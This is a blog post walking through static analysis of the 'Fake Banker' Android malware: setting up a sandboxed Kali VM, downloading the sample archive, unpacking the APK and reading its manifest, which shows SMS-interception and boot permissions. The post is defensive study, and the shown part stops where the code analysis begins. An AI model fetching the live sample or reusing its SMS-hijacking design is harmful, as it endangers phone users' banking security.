<!doctype html>
<html lang="en">
<head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta content='text/html; charset=utf-8' http-equiv='content-type' />

<meta name="generator" content="Hugo 0.120.3">

<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
<link href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" rel="stylesheet"/>
<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
:root {
  --main-color: #8C6056; 
  --secondary-color: #AFD5AA;
  --logo-text-color: #fff;
  --body-text-color: #3d3d3d;
  --heading-text-color: #383838;
  --background-color: #fff;
}</style>
<link href='https://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
<link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
<link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
<link rel="stylesheet" href="https://blog.dornea.nu/css/syntax.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>


<link rel="icon" 
 
  href='https://blog.dornea.nu/favicon.ico'

type="image/x-icon"/>

<link href='https://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />



<script src="https://beamanalytics.b-cdn.net/beam.min.js" data-token="b8a4b728-8eda-42fb-8376-10168c622160" async>

</script>

</head>
<body class="global-font">
  <nav class=" flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id="navbar">
  <div class="flex">
    <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id="site-title" href='https://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
  </div>
  
  <div class=" flex-ns mt2 mt0-ns pv1">
    
      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://blog.dornea.nu/' title="Home">Home</a>
    
      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://dornea.nu' title="About">About</a>
    
      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://blog.dornea.nu/feed.xml' title="RSS">RSS</a>
    
      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://blog.dornea.nu/tags' title="Tags">Tags</a>
    
      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
    
  </div>
  
</nav>
  
<main class="center mv4 content-width ph3">
  <div class="f3 fw6 heading-color heading-font post-title">Disect Android APKs like a Pro - Static code analysis</div>
  <p class="silver f6 mt1 mb4 post-meta">
    <time>07 Jul 2014</time> 
     | 
    

    
     ~
  

17 mins
|

    
    tags: [ <a href='https://blog.dornea.nu/tags/android' class="link silver">android</a> <a href='https://blog.dornea.nu/tags/hacking' class="link silver">hacking</a> <a href='https://blog.dornea.nu/tags/networking' class="link silver">networking</a> <a href='https://blog.dornea.nu/tags/security' class="link silver">security</a> <a href='https://blog.dornea.nu/tags/ipython' class="link silver">ipython</a> <a href='https://blog.dornea.nu/tags/code' class="link silver">code</a> <a href='https://blog.dornea.nu/tags/sca' class="link silver">sca</a> <a href='https://blog.dornea.nu/tags/androguard' class="link silver">androguard</a> <a href='https://blog.dornea.nu/tags/re' class="link silver">re</a> <a href='https://blog.dornea.nu/tags/mobile' class="link silver">mobile</a> <a href='https://blog.dornea.nu/tags/fakebanker' class="link silver">fakebanker</a> <a href='https://blog.dornea.nu/tags/appsec' class="link silver">appsec</a>  ]
    

  </p>
  <div class="lh-copy post-content">
    

      <p>I&rsquo;ve started writing this <a href="http://ipython.org/notebook.html">IPython notebook</a> in order to make myself more comfortable with Android and its SDK. Due to some personal interests I thought I could also have a look at the available <a href="http://en.wikipedia.org/wiki/Reverse_engineering">RE</a> tools and learn more about their pros &amp; cos. In particular I had a closer look at <a href="https://code.google.com/p/androguard/"><strong>AndroGuard</strong></a> which seems to be good at:</p>
<blockquote>
<p>Reverse engineering, Malware and goodware analysis of Android applications &hellip; and more (ninja !)</p>
</blockquote>
<p>I was charmed but its capabilities and the pythonic art of handling with APKs. In the 2nd step I&rsquo;ve needed a malware to play it, so I had a look at <a href="http://contagiominidump.blogspot.de/">Contagio Mobile</a>. There I&rsquo;ve randomly chosen a malware and got stucked with <a href="http://contagiominidump.blogspot.de/2014/05/android-fake-banker.html">Fake Banker</a>. There are some technical details about the malware itself gained during automated tests which can be read <a href="http://www.apk-analyzer.net/analysis/646/3752/0/html">here</a>.</p>
<p>This article will only deal with the <strong>static source code analysis</strong> of the malware. A 2nd part dedicated to the <strong>dynamic analysis</strong> is planed as well.</p>
<h3 id="start-kali-linux">Start Kali Linux</h3>
<p>Stay safe and run the stuff isolated:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">➜  ~  virsh -c qemu:///system           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to virsh, the virtualization interactive terminal.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type:  <span class="s1">&#39;help&#39;</span> <span class="k">for</span> <span class="nb">help</span> with commands
</span></span><span class="line"><span class="cl">       <span class="s1">&#39;quit&#39;</span> to quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">virsh <span class="c1"># </span>
</span></span><span class="line"><span class="cl">virsh <span class="c1"># list --all</span>
</span></span><span class="line"><span class="cl"> Id    Name                           State
</span></span><span class="line"><span class="cl">----------------------------------------------------
</span></span><span class="line"><span class="cl"> <span class="m">2</span>     Ubuntu.GitLab                  running
</span></span><span class="line"><span class="cl"> -     Linux.Kali                     shut off
</span></span><span class="line"><span class="cl"> -     Ubuntu.Tracks                  shut off
</span></span><span class="line"><span class="cl"> -     Windows7                       shut off
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">virsh <span class="c1"># start Linux.Kali</span>
</span></span><span class="line"><span class="cl">Domain Linux.Kali started
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;re ready to login:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">➜  ~  ssh kali.local
</span></span><span class="line"><span class="cl">victor@kali.local<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Linux kali 3.7-trunk-amd64 <span class="c1">#1 SMP Debian 3.7.2-0+kali8 x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Kali GNU/Linux system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="install-sdk">Install SDK</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/SDK# wget http://dl.google.com/android/android-sdk_r22.6.2-linux.tgz
</span></span><span class="line"><span class="cl"><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/SDK# tar -zxf android-sdk_r22.6.2-linux.tgz
</span></span><span class="line"><span class="cl"><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/SDK# <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/root/work/apk/SDK/android-sdk-linux/tools<span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/SDK# which monitor
</span></span><span class="line"><span class="cl">/root/work/apk/SDK/android-sdk-linux/tools/monitor
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Make sure you have the <strong>ia32-libs</strong> installed.</p>
</blockquote>
<h3 id="setup-path">Setup PATH</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Adjust PYTHONPATH</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s1">&#39;~/work/bin/androguard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup new PATH</span>
</span></span><span class="line"><span class="cl"><span class="n">old_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;PATH&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">new_path</span> <span class="o">=</span> <span class="n">old_path</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;/root/work/apk/SDK/android-sdk-linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;PATH&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Change working directory</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s2">&#34;/root/work/apk/&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="setup-ipython-settings">Setup IPython settings</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%pylab inline
</span></span><span class="line"><span class="cl">import pandas as pd
</span></span><span class="line"><span class="cl">import numpy as np
</span></span><span class="line"><span class="cl">import matplotlib.pyplot as plt
</span></span><span class="line"><span class="cl">import networkx as nx
</span></span><span class="line"><span class="cl">from IPython.display import display_pretty, display_html, display_jpeg, display_png, display_json, display_latex, display_svg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Androguard stuff
</span></span><span class="line"><span class="cl">import androlyze as anz
</span></span><span class="line"><span class="cl">#import corae.bytecodes.dvm as dvm
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>Populating the interactive namespace from numpy and matplotlib
</code></pre>
<h2 id="get-malicious-apks">Get malicious APKs</h2>
<p>Now that you got everything running it&rsquo;s time to get some <strong>malicious</strong> APKs to play with. On <a href="http://contagiominidump.blogspot.de/">contagio mobile</a> you&rsquo;ll get tons of malicious files to look at. I&rsquo;ve decided to look at the <a href="http://www.mediafire.com/download/e938k6t3y6ul1yy/FakeBankerAPKs.zip">Fake Banker</a>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/DroidBox/APK# wget http://www.mediafire.com/download/e938k6t3y6ul1yy/FakeBankerAPKs.zip
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now you&rsquo;ll have to extract the archive. As mentioned on the site you&rsquo;ll have to contact the sites maintainer in order to get the password for the files. Thanks to <a href="https://twitter.com/snowfl0w">@snowfl0w</a> for providing me the password.</p>
<blockquote>
<p><strong>NOTE</strong>: The ordinary unzip command will fail to extract the files. You should install <em>p7zip</em>.</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>env<span class="o">)</span>root@kali:~/work/apk/DroidBox/APK# 7z e FakeBankerAPKs.zip 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span></span><span class="line"><span class="cl">p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,1 CPU<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Processing archive: FakeBankerAPKs.zip
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting  7276e76298c50d2ee78271cf5114a176
</span></span><span class="line"><span class="cl">Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting  a15b704743f53d3edb9cdd1182ca78d1
</span></span><span class="line"><span class="cl">Extracting  aac4d15741abe0ee9b4afe78be090599
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Everything is Ok
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Files: <span class="m">3</span>
</span></span><span class="line"><span class="cl">Size:       <span class="m">629877</span>
</span></span><span class="line"><span class="cl">Compressed: <span class="m">622336</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="scratch-the-surface">Scratch the surface</h2>
<p>In this section we&rsquo;ll have a brief look at the APK(s):</p>
<ul>
<li>Which files does the APK contain?</li>
<li>How is the APK built?</li>
<li>Can we find some vital information e.g. permissions the APK will have when installed on the device?</li>
<li>What about other ressources?</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Change CWD
</span></span><span class="line"><span class="cl">os.chdir(&#34;/root/work/apk/DroidBox/APK&#34;)
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="check-apks-contents">Check APKs contents</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in *<span class="p">;</span> <span class="k">do</span> file <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>7276e76298c50d2ee78271cf5114a176: Zip archive data, at least v2.0 to extract
a15b704743f53d3edb9cdd1182ca78d1: Zip archive data, at least v2.0 to extract
aac4d15741abe0ee9b4afe78be090599: Zip archive data, at least v2.0 to extract
</code></pre>
<h3 id="zippped-files">Zippped files</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">unzip -l 7276e76298c50d2ee78271cf5114a176
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>Archive:  7276e76298c50d2ee78271cf5114a176
signed by SignApk
  Length      Date    Time    Name
---------  ---------- -----   ----
     1119  2008-02-29 05:33   META-INF/MANIFEST.MF
     1172  2008-02-29 05:33   META-INF/CERT.SF
     1714  2008-02-29 05:33   META-INF/CERT.RSA
     5004  2008-02-29 05:33   AndroidManifest.xml
   394740  2008-02-29 05:33   classes.dex
     6426  2008-02-29 05:33   res/drawable-hdpi/ic_launcher1.png
    14738  2008-02-29 05:33   res/drawable-hdpi/logo.png
     2052  2008-02-29 05:33   res/drawable-ldpi/ic_launcher1.png
     3231  2008-02-29 05:33   res/drawable-mdpi/ic_launcher1.png
     8824  2008-02-29 05:33   res/drawable-xhdpi/ic_launcher1.png
     1012  2008-02-29 05:33   res/layout/actup.xml
      620  2008-02-29 05:33   res/layout/main.xml
     4200  2008-02-29 05:33   res/layout/main2.xml
      432  2008-02-29 05:33   res/menu/main.xml
       56  2008-02-29 05:33   res/raw/blfs.key
     1048  2008-02-29 05:33   res/raw/config.cfg
     3196  2008-02-29 05:33   resources.arsc
---------                     -------
   449584                     17 files
</code></pre>
<h2 id="dump-apks-content-with-apktool">Dump APKs content with apktool</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">cp 7276e76298c50d2ee78271cf5114a176 FakeBanker.apk
</span></span><span class="line"><span class="cl">java -jar /root/work/bin/apktool1.5.2/apktool.jar d 7276e76298c50d2ee78271cf5114a176 output
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>Destination directory (/root/work/apk/DroidBox/APK/output) already exists. Use -f switch if you want to overwrite it.
</code></pre>
<h3 id="androidmanifestxml">AndroidManifest.xml</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">cat output/AndroidManifest.xml
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.gmail.xpack&quot;
  xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;
    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@drawable/ic_launcher1&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;false&quot;&gt;
        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;com.gmail.xpack.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;service android:name=&quot;com.gmail.xservices.XService&quot; android:exported=&quot;false&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;XMainProcessStart&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/service&gt;
        &lt;service android:name=&quot;com.gmail.xservices.XSmsIncom&quot; /&gt;
        &lt;receiver android:name=&quot;com.gmail.xbroadcast.OnBootReceiver&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.gmail.xbroadcast.MessageReceiver&quot;&gt;
            &lt;intent-filter android:priority=&quot;999&quot;&gt;
                &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.gmail.xservices.XRepeat&quot; android:process=&quot;:remote&quot; /&gt;
        &lt;receiver android:name=&quot;com.gmail.xservices.XUpdate&quot; android:process=&quot;:remote&quot; /&gt;
        &lt;activity android:name=&quot;ActUpdate&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;com.gmail.xpack.updateact&quot; /&gt;
                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre>
<h3 id="check-for-media">Check for media</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">media_paths = !find output -regextype posix-egrep -regex &#34;^.*\.(png|jpg|jpeg|gif|bmp)$&#34;
</span></span><span class="line"><span class="cl">display(media_paths)
</span></span><span class="line"><span class="cl">for p in media_paths:
</span></span><span class="line"><span class="cl">    display(Image(filename=p))
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>['output/res/drawable-ldpi/ic_launcher1.png',
 'output/res/drawable-mdpi/ic_launcher1.png',
 'output/res/drawable-xhdpi/ic_launcher1.png',
 'output/res/drawable-hdpi/logo.png',
 'output/res/drawable-hdpi/ic_launcher1.png']
</code></pre>
<p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_1.png" alt="png"></p>
<p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_2.png" alt="png"></p>
<p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_3.png" alt="png"></p>
<p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_4.png" alt="png"></p>
<p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_5.png" alt="png"></p>
<h3 id="directory-structure">Directory structure</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl"><span class="c1"># Ignore smali directory</span>
</span></span><span class="line"><span class="cl">tree -f -I <span class="s2">&#34;smali&#34;</span> output/
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>output
├── output/AndroidManifest.xml
├── output/apktool.yml
└── output/res
    ├── output/res/drawable-hdpi
    │   ├── output/res/drawable-hdpi/ic_launcher1.png
    │   └── output/res/drawable-hdpi/logo.png
    ├── output/res/drawable-ldpi
    │   └── output/res/drawable-ldpi/ic_launcher1.png
    ├── output/res/drawable-mdpi
    │   └── output/res/drawable-mdpi/ic_launcher1.png
    ├── output/res/drawable-xhdpi
    │   └── output/res/drawable-xhdpi/ic_launcher1.png
    ├── output/res/layout
    │   ├── output/res/layout/actup.xml
    │   ├── output/res/layout/main2.xml
    │   └── output/res/layout/main.xml
    ├── output/res/menu
    │   └── output/res/menu/main.xml
    ├── output/res/raw
    │   ├── output/res/raw/blfs.key
    │   └── output/res/raw/config.cfg
    └── output/res/values
        ├── output/res/values/ids.xml
        ├── output/res/values/public.xml
        ├── output/res/values/strings.xml
        └── output/res/values/styles.xml

9 directories, 17 files
</code></pre>
<h3 id="first-findings">First findings</h3>
<p>Having a look at the <em>AndroidManifest.xml</em> file itself you can see that we have a <em>MessageReceiver</em> with a quite high priority:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"> <span class="nt">&lt;receiver</span> <span class="na">android:name=</span><span class="s">&#34;com.gmail.xbroadcast.MessageReceiver&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;intent-filter</span> <span class="na">android:priority=</span><span class="s">&#34;999&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.provider.Telephony.SMS_RECEIVED&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/intent-filter&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/receiver&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>That looks very suspicious as well. What about the main <strong>entry point</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"> <span class="nt">&lt;activity</span> <span class="na">android:label=</span><span class="s">&#34;@string/app_name&#34;</span> <span class="na">android:name=</span><span class="s">&#34;com.gmail.xpack.MainActivity&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;intent-filter&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.MAIN&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.LAUNCHER&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/intent-filter&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/activity&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So obviously the class <em>com.gmail.xpack.MainActivity</em> contains the main entry point. In the next steps we will have a closer look at the code. Besides that there are 2 files which might be interesting:</p>
<ul>
<li><code>output/res/raw/blfs.key</code></li>
<li><code>output/res/raw/config.cfg</code></li>
</ul>
<h2 id="static-code-analysis-using-androguard">Static code analysis using AndroGuard</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
